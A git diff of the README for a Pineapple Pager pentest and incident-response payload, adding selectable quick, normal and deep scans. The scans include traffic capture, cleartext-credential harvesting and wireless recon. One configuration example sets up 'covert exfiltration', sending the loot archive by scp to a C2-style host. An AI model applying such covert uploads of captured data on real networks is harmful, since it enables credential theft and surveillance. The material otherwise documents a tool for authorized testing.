@@ -2,15 +2,73 @@
 
 *Author:* **curtthecoder**
 
-*Version:* **1.0**
+*Version:* **2.0**
+## _Description_
 
-## Description
+A comprehensive incident response and penetration testing payload for the Pineapple Pager that performs extensive network reconnaissance, forensic collection, and security analysis. This payload includes advanced features specifically designed for professional penetration testing engagements.
 
-A comprehensive incident response and penetration testing payload for the Pineapple Pager that performs extensive network reconnaissance, forensic collection, and security analysis. This payload includes advanced features specifically designed for professional penetration testing engagements. This scan can take up to 20 minutes to run, just a F.Y.I, before you run it. 
+**NEW in v2.0**: Interactive scan type selection - choose **QUICK**, **NORMAL**, or **DEEP** via on-device prompt to match your time constraints and assessment needs.
 
 *Also after you run this, there will be a lot of juicy data in the folders. Nothing juicy displays on the pager while it's running. So for demoing purposes, not unless you are in a testing enviroment, you may want to keep this data to yourself, or share with someone you are running the report for.*
 
-## Features
+## _Scan Types_
+
+Choose your scan type based on time available and depth needed:
+
+| Scan Type | Duration   | Best For |
+|-----------|------------|----------|
+| **QUICK** | ~1-5 min   | Initial recon, time-sensitive situations |
+| **NORMAL** | ~10-15 min | Standard penetration tests, most scenarios |
+| **DEEP** | ~25+ min   | Full incident response, detailed forensics |
+
+### What Each Scan Includes
+
+#### QUICK Scan (~1-5 min)
+Core reconnaissance - fast snapshot of the environment:
+- System Information (processes, memory, disk)
+- Network Configuration (interfaces, routing, ARP, connections)
+- WiFi Scan (nearby networks with basic security info)
+- DHCP Leases
+- Firewall Rules (iptables)
+- Log Collection
+
+#### NORMAL Scan (~10-15 min)
+Everything in QUICK, plus:
+- Client Fingerprinting (MAC OUI lookup, OS detection)
+- Rogue Device Detection (rogue DHCP, duplicate IPs, MAC spoofing)
+- Traffic Capture (30 seconds)
+- Credential Scanning (FTP, HTTP, Telnet, SMTP, etc.)
+- Geolocation (GPS if available, WiFi-based positioning)
+- Historical Comparison (detect new networks/clients since last scan)
+
+#### DEEP Scan (~25+ min)
+Everything in NORMAL, plus:
+- Extended Traffic Capture (120 seconds)
+- Service Discovery (mDNS, NetBIOS, SNMP, UPnP, SMB)
+- Wireless Recon with monitor mode (channel hopping, probe requests)
+- Bluetooth/BLE Scanning
+- Full WiFi Security Analysis (handshakes, encryption weaknesses, evil twin detection)
+- Recon.db Analysis (historical Pineapple intelligence)
+
+### Selecting a Scan Type
+
+When you run the payload, you'll be prompted to select your scan type:
+
+```
+=== INCIDENT RESPONSE SCANNER ===
+
+Select scan type:
+
+1. QUICK  (~1-5 min)  - Fast recon
+2. NORMAL (~10-15 min) - Balanced scan
+3. DEEP   (~25+ min)  - Full forensics
+
+Select scan type (1-3): [3]
+```
+
+Use the number picker to select your preferred scan depth. The default is DEEP (3) if no selection is made.
+
+## _Features_
 
 ### Core Functionality
 - **System Information Collection**: Captures system state, processes, memory usage, and disk information
@@ -219,33 +277,40 @@ Analyzes the Pagers's recon.db for historical intelligence:
 - **Configurable Methods**: Supports multiple transfer protocols
 - **Secure Deletion**: Option to remove unencrypted data post-encryption
 
-## Configuration
+## _Configuration_
 
 Edit the configuration variables at the top of `payload.sh`:
 
 ```bash
-# Basic Configuration
-PCAP_TIME=60                      # Capture duration in seconds (default: 60)
-PCAP_SNAPLEN=65535                # Full packet capture
-PCAP_COUNT=5000                   # Max packets per interface
+# ============================================================================
+# SCAN TYPE SELECTION
+# ============================================================================
+# Scan type is selected interactively when you run the payload.
+# You'll be prompted to choose: 1=QUICK, 2=NORMAL, 3=DEEP
 
 # Scan Identification
 SCAN_LABEL=""                     # Add custom label to folder name (e.g., "office_breach", "client_site_a")
                                   # Leave empty for timestamp-only naming
                                   # Result: IR_YYYYMMDD_HHMMSS_label
 
-# Feature Toggles
-ENABLE_CREDENTIAL_SCAN=true       # Enable credential detection
-ENABLE_SERVICE_DISCOVERY=true     # Enable service enumeration
-ENABLE_BLUETOOTH_SCAN=true        # Enable Bluetooth/BLE device scanning
-ENABLE_WIFI_SECURITY_ANALYSIS=true # Enable WiFi security analysis (handshakes, encryption, rogues)
-ENABLE_RECON_DB_ANALYSIS=true     # Analyze recon.db
-ENABLE_HISTORICAL_COMPARISON=true # Enable timeline analysis
-ENABLE_REMOTE_SYNC=false          # Enable auto-upload
-ENCRYPT_ARCHIVE=false             # Enable encryption
+# ============================================================================
+# CAPTURE SETTINGS (can be overridden regardless of scan type)
+# ============================================================================
+PCAP_SNAPLEN=65535                # Full packet capture
+PCAP_COUNT=10000                  # Max packets per interface
 
-# Recon Database (if ENABLE_RECON_DB_ANALYSIS=true)
+# Wireless Reconnaissance Configuration (used when ENABLE_WIRELESS_RECON=true)
+CHANNEL_HOP_INTERVAL=0.5          # Seconds per channel
+RECON_PHY="auto"                  # Physical device: "auto" or specify "phy0", "phy1", etc.
+
+# Recon Database Path
 RECON_DB_PATH="/root/recon/recon.db"  # Also checks /mmc/root/recon/recon.db
+
+# ============================================================================
+# ARCHIVE & REMOTE SYNC
+# ============================================================================
+ENABLE_REMOTE_SYNC=false          # Enable auto-upload
+ENCRYPT_ARCHIVE=false             # Enable AES-256 encryption
 
 # Remote Sync (if ENABLE_REMOTE_SYNC=true)
 REMOTE_SERVER=""                  # user@server.com
@@ -259,7 +324,9 @@ ENCRYPTION_PASSWORD=""            # Set password or leave empty for prompt
 ENABLE_UPDATE_CHECK=true          # Set to false to disable version checking
 ```
 
-## Automatic Update Check
+**Note**: Feature toggles like `ENABLE_CREDENTIAL_SCAN`, `ENABLE_SERVICE_DISCOVERY`, etc. are automatically set based on your `SCAN_TYPE` selection. You can override individual settings after the scan type configuration block if needed.
+
+## _Automatic Update Check_
 
 The payload includes an automatic version check feature that compares your local version against the latest version available on GitHub.
 
@@ -281,7 +348,7 @@ Set `ENABLE_UPDATE_CHECK=false` in the configuration section of `payload.sh`
 ```
 ════════════════════════════════════════════════════════
   🆕 UPDATE AVAILABLE!
-  Current: v1.0 → Latest: v2.0
+  Current: v2.0 → Latest: v2.1
   Update at: github.com/hak5/wifipineapplepager-payloads
 ════════════════════════════════════════════════════════
 ```
@@ -289,10 +356,10 @@ Set `ENABLE_UPDATE_CHECK=false` in the configuration section of `payload.sh`
 **Example output when up-to-date:**
 ```
 [*] Checking for updates...
-    [OK] Running latest version (v1.0)
+    [OK] Running latest version (v2.0)
 ```
 
-## Output Structure
+## _Output Structure_
 
 ```
 /root/loot/incident_response/IR_YYYYMMDD_HHMMSS_[label]/
@@ -350,7 +417,7 @@ Set `ENABLE_UPDATE_CHECK=false` in the configuration section of `payload.sh`
     └── [system logs]
 ```
 
-## Dependencies
+## _Dependencies_
 
 ### Core Requirements (Built-in)
 - bash
@@ -380,7 +447,7 @@ These tools are **not required** - the payload runs fine without them. However, 
 
 **Note**: Deep packet analysis and credential scanning use `tcpdump` (built-in) instead of `tshark`, making the payload more lightweight.
 
-## Usage
+## _Usage_
 
 ### Basic Usage
 1. Copy the entire `/incident_response/incident_scanner/` folder to your Pager
@@ -390,30 +457,30 @@ These tools are **not required** - the payload runs fine without them. However, 
 
 ### Advanced Configuration Examples
 
-#### Example 1: High-Security Pentest with Encryption
+**Note**: Scan type is selected interactively when you run the payload. The examples below show additional configuration options you can set in `payload.sh`.
+
+#### Example 1: Labeled Site Survey
 ```bash
-PCAP_TIME=120
-ENABLE_CREDENTIAL_SCAN=true
+# When prompted, select 1 for QUICK scan
+SCAN_LABEL="site_survey"
+```
+
+#### Example 2: Encrypted Archive
+```bash
+# When prompted, select your desired scan type
 ENCRYPT_ARCHIVE=true
 ENCRYPTION_PASSWORD="YourStrongPassword123!"
 ```
 
-#### Example 2: Covert Exfiltration
+#### Example 3: Full Incident Response with Covert Exfiltration
 ```bash
+# When prompted, select 3 for DEEP scan
+SCAN_LABEL="ir_investigation"
 ENABLE_REMOTE_SYNC=true
 REMOTE_SERVER="user@c2-server.com"
 REMOTE_PATH="/var/loot/pager"
 REMOTE_METHOD="scp"
 ENCRYPT_ARCHIVE=true
-```
-
-#### Example 3: Quick Reconnaissance (Minimal Features)
-```bash
-PCAP_TIME=30
-ENABLE_CREDENTIAL_SCAN=false
-ENABLE_SERVICE_DISCOVERY=false
-ENABLE_DEEP_PACKET_ANALYSIS=false
-ENABLE_BLUETOOTH_SCAN=false
 ```
 
 #### Example 4: Labeled Scans for Multiple Daily Engagements
@@ -428,7 +495,7 @@ SCAN_LABEL="after-hours-scan"     # Creates: IR_20260118_203015_after_hours_scan
 
 **Note**: Labels are automatically sanitized (lowercase, special chars replaced with underscores).
 
-## Security Considerations
+## _Security Considerations_
 
 ### Legal & Ethical
 - **Authorization Required**: Only use on networks you own or have explicit written permission to test
@@ -449,7 +516,7 @@ SCAN_LABEL="after-hours-scan"     # Creates: IR_20260118_203015_after_hours_scan
 - Consider automatic deletion of uncompressed data after archiving
 - Secure deletion recommended for decommissioned storage media
 
-## Penetration Testing Workflow
+## _Penetration Testing Workflow_
 
 ### Pre-Engagement
 1. Configure payload for engagement scope
@@ -481,7 +548,7 @@ SCAN_LABEL="after-hours-scan"     # Creates: IR_20260118_203015_after_hours_scan
 5. Sanitize sensitive data before client delivery
 6. Provide remediation recommendations
 
-## Severity Scoring Reference
+## _Severity Scoring Reference_
 
 The payload automatically calculates a risk score based on findings:
 
@@ -499,7 +566,7 @@ The payload automatically calculates a risk score based on findings:
 - **LOW** (1-49 pts): Minor issues detected
 - **CLEAN** (0 pts): No significant issues
 
-## Key Findings Interpretation
+## _Key Findings Interpretation_
 
 ### Critical Findings
 - **Cleartext Credentials**: Immediate credential compromise risk - passwords exposed in network traffic
@@ -527,7 +594,7 @@ The payload automatically calculates a risk score based on findings:
 - **DNS Queries**: Data exfiltration detection, user behavior
 - **Top Talkers**: Network architecture understanding
 
-## Troubleshooting
+## _Troubleshooting_
 
 ### Common Issues
 
@@ -569,28 +636,53 @@ The payload automatically calculates a risk score based on findings:
 - Check `gpsd` installation and configuration
 - WiFi geolocation still available as fallback
 
-## Performance Notes
+## _Performance Notes_
 
-- Full feature set with 60s capture: ~2-20 minutes total runtime
-- Archive size varies: 50MB-500MB depending on traffic volume
-- Deep packet analysis (tcpdump-based) adds ~20-40 seconds processing time
+### Scan Type Duration
+| Scan Type | Typical Duration | Archive Size |
+|-----------|------------------|--------------|
+| QUICK | 1-5 minutes      | 10-50 MB |
+| NORMAL | 10-15 minutes    | 50-150 MB |
+| DEEP | 25+ minutes      | 100-500 MB |
+
+### Feature Timing Breakdown
 - Service discovery adds ~20-40 seconds
 - Bluetooth scanning adds ~30 seconds (if adapter present)
 - Historical comparison is near-instant (<5s)
 - Credential scanning adds ~10-20 seconds per pcap file
+- Traffic capture: 0s (QUICK) / 30s (NORMAL) / 120s (DEEP)
 - Using `tcpdump` instead of `tshark` significantly reduces CPU/memory usage
 
-## Credits
+### Storage Considerations
+- Archive size varies with traffic volume and capture duration
+- DEEP scans with high network activity may exceed 500MB
+- Consider available storage before running extended scans
+
+## _Credits_
 
 - **Author**: curtthecoder
-- **Version**: 1.0
+- **Version**: 2.0
 - **Tools**: tcpdump, iw, hcitool, various network utilities
 
-## License
+## _Changelog_
+
+### v2.0
+- **NEW**: Interactive Scan Type Selection via on-device prompt
+  - Uses PROMPT and NUMBER_PICKER for runtime selection
+  - 1 = QUICK (~1-5 min): Fast reconnaissance for time-sensitive situations
+  - 2 = NORMAL (~10-15 min): Balanced scan for standard penetration tests
+  - 3 = DEEP (~25+ min): Full forensic collection (original behavior)
+- Features are automatically enabled/disabled based on scan type
+- Updated output to show scan type in reports and summaries
+
+### v1.0
+- Initial release with full feature set
+
+## _License_
 
 Use responsibly and only with proper authorization. I am not responsible for misuse or damage caused by this tool.
 
-## Support
+## _Support_
 
 For issues, feature requests, or questions:
 - Review this README thoroughly
